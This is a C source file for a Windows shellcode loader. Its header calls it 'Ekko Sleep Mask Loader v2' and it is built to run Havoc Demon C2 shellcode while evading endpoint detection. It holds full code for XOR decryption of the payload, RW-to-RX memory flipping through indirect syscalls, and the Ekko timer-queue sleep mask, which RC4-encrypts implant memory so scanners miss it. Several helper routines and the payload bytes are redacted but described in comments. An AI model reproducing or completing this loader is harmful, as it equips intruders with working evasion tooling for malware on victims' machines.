/*
============================================================
    EKKO SLEEP MASK LOADER — v2
============================================================

    technique stack:
    - XOR encrypted shellcode at rest
    - RW -> RX memory pattern (no RWX)
    - Indirect syscalls via RecycledGate
    - Ekko sleep masking (RC4 encrypts memory during sleep)

    references:
    github.com/thefLink/RecycledGate   — indirect syscalls
    github.com/am0nsec/HellsGate       — SSN resolution
    github.com/Cracked5pider/Ekko      — sleep masking

    build:
    nasm -f win64 syscall.asm -o syscall.o
    x86_64-w64-mingw32-gcc loader.c syscall.o -o loader.exe -lntdll

    shellcode:
    generate Demon shellcode from Havoc
    encrypt with tools/encrypt_shellcode.py
    paste xor_key[] and shellcode[] before compiling
============================================================
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ============================================================
   WINDOWS TYPES — manual, no windows.h
   ============================================================ */
typedef unsigned char      BYTE;
typedef unsigned char      BOOLEAN;
typedef unsigned char      CHAR;
typedef unsigned short     WORD;
typedef unsigned int       DWORD;
typedef unsigned long      ULONG;
typedef unsigned long long ULONGLONG;
typedef unsigned long long SIZE_T;
typedef unsigned long long DWORD64;
typedef void*              LPVOID;
typedef void*              PVOID;
typedef void*              HANDLE;
typedef void*              HMODULE;
typedef int                BOOL;
typedef long               NTSTATUS;
typedef void               VOID;

#define TRUE                    1
#define FALSE                   0
#define INFINITE                0xFFFFFFFF
#define CONTEXT_FULL            0x10007L
#define NT_SUCCESS(x)           ((x) >= 0)
#define WT_EXECUTEINTIMERTHREAD 0x00000020
#define NTAPI                   __attribute__((ms_abi))
#define MEM_COMMIT              0x00001000
#define MEM_RESERVE             0x00002000
#define MEM_RELEASE             0x00008000
#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE_READ       0x20

/* ============================================================
   CONTEXT STRUCT — full x64, needed for RtlCaptureContext
   ============================================================ */
typedef struct {
    DWORD64 P1Home; DWORD64 P2Home; DWORD64 P3Home;
    DWORD64 P4Home; DWORD64 P5Home; DWORD64 P6Home;
    DWORD ContextFlags; DWORD MxCsr;
    WORD SegCs; WORD SegDs; WORD SegEs; WORD SegFs;
    WORD SegGs; WORD SegSs; DWORD EFlags;
    DWORD64 Dr0; DWORD64 Dr1; DWORD64 Dr2; DWORD64 Dr3;
    DWORD64 Dr6; DWORD64 Dr7;
    DWORD64 Rax; DWORD64 Rcx; DWORD64 Rdx; DWORD64 Rbx;
    DWORD64 Rsp; DWORD64 Rbp; DWORD64 Rsi; DWORD64 Rdi;
    DWORD64 R8;  DWORD64 R9;  DWORD64 R10; DWORD64 R11;
    DWORD64 R12; DWORD64 R13; DWORD64 R14; DWORD64 R15;
    DWORD64 Rip;
    BYTE ExtendedRegisters[512];
} CONTEXT;

/* ============================================================
   PE STRUCTS — for EAT walk and PEB traversal
   ============================================================ */
typedef struct { WORD e_magic; BYTE e_padding[58]; DWORD e_lfanew; } IMAGE_DOS_HEADER;
typedef struct { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp;
    DWORD PointerToSymbolTable; DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER;
typedef struct { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY;
typedef struct {
    WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion;
    DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase;
    DWORD SectionAlignment; DWORD FileAlignment;
    WORD MajorOSVersion; WORD MinorOSVersion;
    WORD MajorImageVersion; WORD MinorImageVersion;
    WORD MajorSubsystemVersion; WORD MinorSubsystemVersion;
    DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders;
    DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics;
    ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit;
    ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit;
    DWORD LoaderFlags; DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;
typedef struct {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;
typedef struct {
    DWORD Characteristics; DWORD TimeDateStamp;
    WORD MajorVersion; WORD MinorVersion;
    DWORD Name; DWORD Base;
    DWORD NumberOfFunctions; DWORD NumberOfNames;
    DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;

/* ============================================================
   SYSCALL STRUCT — SSN + gate address per function
   ============================================================ */
typedef struct { PVOID pRecycledGate; DWORD dwSyscallNr; } Syscall;

/* ============================================================
   ASM STUBS — live in syscall.asm
   ============================================================ */
extern void     PrepareSyscall(DWORD ssn, PVOID gate);
extern NTSTATUS DoSyscall(...);

/* ============================================================
   get_ntdll_base — PEB walk to locate ntdll
   reference: Windows Internals, public NT documentation
   ============================================================ */
BYTE *get_ntdll_base(void) {
    /* REDACTED
       GS:0x60 → PEB → PEB_LDR_DATA → InLoadOrderModuleList
       second entry is always ntdll on Windows x64
       reference: Windows Internals 7th ed., public NT docs */
    return NULL;
}

/* ============================================================
   get_syscall — RecycledGate SSN resolution
   reference: github.com/thefLink/RecycledGate
   Hell's Gate + Halo's Gate + ntdll .text gadget reuse
   ============================================================ */
Syscall get_syscall(char *func_name) {
    /* REDACTED
       walks ntdll EAT to locate target Nt function stub
       Hell's Gate:  func[0]==0x4C → read SSN from func+4
       Halo's Gate:  func[0]==0xE9 → stub hooked, recover SSN from ±neighbour stubs
       RecycledGate: scan stub for 0x0F 0x05 0xC3 (syscall;ret) — use as gate
       executing syscall from ntdll .text defeats RIP-based EDR detection
       reference: github.com/thefLink/RecycledGate */
    Syscall r = {0};
    return r;
}

/* ============================================================
   get_function — custom GetProcAddress via ntdll EAT walk
   reference: github.com/thefLink/RecycledGate
   ============================================================ */
PVOID get_function(char *func_name) {
    /* REDACTED
       walks ntdll IMAGE_EXPORT_DIRECTORY without calling GetProcAddress
       AddressOfNames → AddressOfNameOrdinals → AddressOfFunctions
       reference: github.com/thefLink/RecycledGate */
    return NULL;
}

/* case insensitive string compare */
int str_iequal(char *a, char *b) {
    while (*a && *b) {
        char ca = *a >= 'A' && *a <= 'Z' ? *a + 32 : *a;
        char cb = *b >= 'A' && *b <= 'Z' ? *b + 32 : *b;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

/* ============================================================
   get_module_base — PEB InLoadOrderModuleList walk
   ============================================================ */
BYTE *get_module_base(char *dll_name) {
    /* REDACTED
       GS:0x60 → PEB → Ldr → InLoadOrderModuleList
       traverse until BaseDllName matches target
       reference: Windows Internals, public NT documentation */
    return NULL;
}

/* ============================================================
   get_function_from — EAT walk for any loaded DLL
   ============================================================ */
PVOID get_function_from(char *dll_name, char *func_name) {
    /* REDACTED
       get_module_base() + EAT walk — same as get_function()
       but for any DLL in the PEB module list, not just ntdll */
    return NULL;
}

/* ============================================================
   EKKO SLEEP MASK
   source: github.com/Cracked5pider/Ekko
   RC4 encrypts beacon memory during sleep via RtlCreateTimer
   ============================================================ */
typedef struct { ULONG Length; ULONG MaximumLength; PVOID Buffer; } USTRING;

typedef NTSTATUS (NTAPI *pNtContinue)(CONTEXT *, BOOL);
typedef NTSTATUS (NTAPI *pRtlCreateTimerQueue)(HANDLE *);
typedef NTSTATUS (NTAPI *pRtlCreateTimer)(HANDLE, HANDLE *, PVOID, PVOID, DWORD, DWORD, ULONG);
typedef NTSTATUS (NTAPI *pRtlDeleteTimerQueue)(HANDLE);
typedef NTSTATUS (NTAPI *pSystemFunction032)(USTRING *, USTRING *);
typedef VOID     (NTAPI *pRtlCaptureContext)(CONTEXT *);
typedef HANDLE   (NTAPI *pCreateEventA)(PVOID, BOOL, BOOL, const char *);
typedef DWORD    (NTAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL     (NTAPI *pCloseHandle)(HANDLE);
typedef DWORD    (NTAPI *pGetTickCount)(void);
typedef BOOL     (NTAPI *pVirtualProtect)(PVOID, SIZE_T, DWORD, DWORD *);

VOID NTAPI FlipToRW(PVOID addr, BOOLEAN ignored) {
    DWORD old;
    pVirtualProtect VirtualProtect =
        (pVirtualProtect)get_function_from("kernel32.dll", "VirtualProtect");
    VirtualProtect(addr, 0x1000, PAGE_READWRITE, &old);
}

VOID NTAPI FlipToRX(PVOID addr, BOOLEAN ignored) {
    DWORD old;
    pVirtualProtect VirtualProtect =
        (pVirtualProtect)get_function_from("kernel32.dll", "VirtualProtect");
    VirtualProtect(addr, 0x1000, PAGE_EXECUTE_READ, &old);
}

void EkkoSleep(DWORD ms, PVOID bytes, ULONG len) {
    pCreateEventA        CreateEventA        = (pCreateEventA)       get_function_from("kernel32.dll", "CreateEventA");
    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)get_function_from("kernel32.dll", "WaitForSingleObject");
    pCloseHandle         CloseHandle         = (pCloseHandle)        get_function_from("kernel32.dll", "CloseHandle");
    pGetTickCount        GetTickCount        = (pGetTickCount)       get_function_from("kernel32.dll", "GetTickCount");
    pNtContinue          NtContinue          = (pNtContinue)         get_function("NtContinue");
    pRtlCreateTimerQueue RtlCreateTimerQueue = (pRtlCreateTimerQueue)get_function("RtlCreateTimerQueue");
    pRtlCreateTimer      RtlCreateTimer      = (pRtlCreateTimer)     get_function("RtlCreateTimer");
    pRtlDeleteTimerQueue RtlDeleteTimerQueue = (pRtlDeleteTimerQueue)get_function("RtlDeleteTimerQueue");
    pRtlCaptureContext   RtlCaptureContext   = (pRtlCaptureContext)  get_function("RtlCaptureContext");
    pSystemFunction032   SystemFunction032   = (pSystemFunction032)  get_function_from("advapi32.dll", "SystemFunction032");

    if (!NtContinue || !RtlCreateTimerQueue || !RtlCreateTimer ||
        !RtlDeleteTimerQueue || !RtlCaptureContext || !SystemFunction032)
        return;

    /* random RC4 key — new key every sleep cycle */
    CHAR  key[16];
    DWORD i;
    srand(GetTickCount());
    for (i = 0; i < 16; i++)
        key[i] = (CHAR)(rand() % 256);

    USTRING Key  = {sizeof(key), sizeof(key), key};
    USTRING Data = {len, len, bytes};

    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!hEvent) return;

    CONTEXT ctx = {0}, ctxWait = {0};
    ctx.ContextFlags = ctxWait.ContextFlags = CONTEXT_FULL;
    RtlCaptureContext(&ctx);
    RtlCaptureContext(&ctxWait);

    /* redirect ctxWait to WaitForSingleObject — ROP-style dispatch */
    ctxWait.Rip = (DWORD64)WaitForSingleObject;
    ctxWait.Rcx = (DWORD64)hEvent;
    ctxWait.Rdx = (DWORD64)ms;

    HANDLE hTimerQueue = NULL;
    RtlCreateTimerQueue(&hTimerQueue);
    if (!hTimerQueue) { CloseHandle(hEvent); return; }

    HANDLE ht1, ht2, ht3, ht4, ht5;

    /* T1: RX→RW so SystemFunction032 can write encrypted bytes */
    RtlCreateTimer(hTimerQueue, &ht1, (PVOID)FlipToRW,
        (PVOID)bytes, 0, 0, WT_EXECUTEINTIMERTHREAD);

    /* T2: RC4 encrypt beacon memory — scanner sees garbage */
    RtlCreateTimer(hTimerQueue, &ht2, (PVOID)SystemFunction032,
        &Data, 0, 0, WT_EXECUTEINTIMERTHREAD);

    /* T3: NtContinue → WaitForSingleObject — sleep without direct call */
    RtlCreateTimer(hTimerQueue, &ht3, (PVOID)NtContinue,
        &ctxWait, 0, 0, WT_EXECUTEINTIMERTHREAD);

    /* T4: RC4 decrypt — RC4 is symmetric, encrypt twice = original */
    RtlCreateTimer(hTimerQueue, &ht4, (PVOID)SystemFunction032,
        &Data, ms, 0, WT_EXECUTEINTIMERTHREAD);

    /* T5: RW→RX — beacon executable again */
    RtlCreateTimer(hTimerQueue, &ht5, (PVOID)FlipToRX,
        (PVOID)bytes, ms, 0, WT_EXECUTEINTIMERTHREAD);

    WaitForSingleObject(hEvent, INFINITE);
    RtlDeleteTimerQueue(hTimerQueue);
    CloseHandle(hEvent);
}

/* ============================================================
   MAIN
   ============================================================ */
int main(void) {

    /* SSN resolution via RecycledGate
       reference: github.com/thefLink/RecycledGate */
    Syscall sysAlloc   = get_syscall("NtAllocateVirtualMemory");
    Syscall sysProtect = get_syscall("NtProtectVirtualMemory");
    Syscall sysFree    = get_syscall("NtFreeVirtualMemory");

    /* shellcode — pre-encrypted at build time via tools/encrypt_shellcode.py
       paste output of encrypt_shellcode.py here before compiling */
    unsigned char xor_key[]   = { /* REDACTED */ };
    unsigned char shellcode[] = { /* REDACTED */ };
    SIZE_T len = sizeof(shellcode);
    ULONG  old_protect;

    /* allocate RW via NtAllocateVirtualMemory — indirect syscall */
    PVOID  buf  = NULL;
    SIZE_T size = len;
    PrepareSyscall(sysAlloc.dwSyscallNr, sysAlloc.pRecycledGate);
    NTSTATUS status = DoSyscall(
        (HANDLE)-1, &buf, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) return 1;

    /* copy + XOR decrypt in one pass — plaintext never in binary */
    BYTE *bytes = (BYTE *)buf;
    int j;
    for (j = 0; j < len; j++)
        bytes[j] = shellcode[j] ^ xor_key[j % 16];

    /* RW→RX via NtProtectVirtualMemory — indirect syscall, no RWX */
    PVOID  protect_addr = buf;
    SIZE_T protect_size = len;
    PrepareSyscall(sysProtect.dwSyscallNr, sysProtect.pRecycledGate);
    status = DoSyscall(
        (HANDLE)-1, &protect_addr, &protect_size,
        PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(status)) return 1;

    /* execute + Ekko sleep mask */
    void (*exec)() = (void(*)())bytes;
    exec();
    EkkoSleep(5000, bytes, (ULONG)len);

    /* free via NtFreeVirtualMemory — indirect syscall */
    PVOID  free_addr = buf;
    SIZE_T free_size = 0;
    PrepareSyscall(sysFree.dwSyscallNr, sysFree.pRecycledGate);
    DoSyscall((HANDLE)-1, &free_addr, &free_size, MEM_RELEASE);
    return 0;
}